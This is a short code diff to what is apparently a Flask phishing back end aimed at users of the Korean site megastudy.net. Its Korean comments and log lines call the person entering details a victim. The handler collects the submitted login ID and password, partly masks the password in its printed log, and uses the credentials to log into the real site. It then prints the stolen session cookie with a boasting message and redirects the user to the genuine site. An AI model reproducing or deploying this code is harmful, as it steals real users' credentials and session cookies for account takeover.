@@ -14,12 +14,14 @@ def login():
     username = request.form.get("loginid")  # 폼 필드 이름에 맞춰야 함
     password = request.form.get("loginpw")
 
+    masked_password = '*' * min(5, len(password)) + password[5:] if password else ''
+
     print(f"입력된 피해자의 아이디: {username}")
-    print(f"입력된 피해자의 패스워드: {password}")
+    print(f"입력된 피해자의 패스워드: {masked_password}")
 
     cookie_value = login_to_megastudy(username, password)
     
-    print("세션 쿠키:", cookie_value)
+    print("세션 쿠키 털었죠? :", cookie_value)
 
     return redirect("https://www.megastudy.net/") 
 
